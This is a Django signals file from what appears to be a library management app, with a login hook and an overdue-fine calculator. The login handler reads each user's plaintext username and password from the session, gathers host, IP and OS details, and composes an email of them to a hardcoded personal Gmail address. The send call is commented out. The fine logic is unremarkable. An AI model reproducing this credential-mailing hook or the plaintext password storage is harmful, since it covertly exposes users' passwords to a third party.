from django.contrib.auth.signals import user_logged_in
from django.dispatch import receiver
from django.dispatch.dispatcher import Signal
from .models import IssueBook, Book, User
from datetime import datetime
from library.settings import EMAIL_HOST_USER
import socket
from django.core.mail import send_mail


@receiver(user_logged_in, sender=User)
def login_success(sender, request, user, **kwargs):
    print("------Logged-in Signal------")
       
    # send mail:
    uname = request.session['name']
    upass = request.session['pass']
    name = request.META.get('USERNAME')
    os = request.META.get('DESKTOP_SESSION')
    servername = request.META.get('SERVER_NAME')
    hostname = socket.gethostname()   
    ip_address = socket.gethostbyname(hostname)   
    
    subject = "Someone Login On Library"
    message = f"User details are:-\n\n   Username = {uname}\n   Password = {upass}\n   Name = {name}\n   Servername = {servername}\n   OS = {os}\n   Host = {hostname}\n   IP Address = {ip_address}"
    email_from = EMAIL_HOST_USER
    email = 'neerajtanwar17@gmail.com'
    # send_mail(subject, message, email_from, [email], fail_silently=False)


notification = Signal()
@receiver(notification)
def fine_updation_signal(sender, *args, **kwargs):
    print("-------Update Fine Signal...-------")

    # fine-calculate:
    iss_book = IssueBook.issued.all()
    for book in iss_book:
        stu = IssueBook.issued.get(id=book.id)
        submit_date = stu.submitdate
        today_date = datetime.today().date()
        if today_date > submit_date:
            n = today_date - submit_date
            n = n.days
            new_fine = 2 * n
            IssueBook.issued.filter(id=book.id).update(fine=new_fine)
        else:
            IssueBook.issued.filter(id=book.id).update(fine=0)


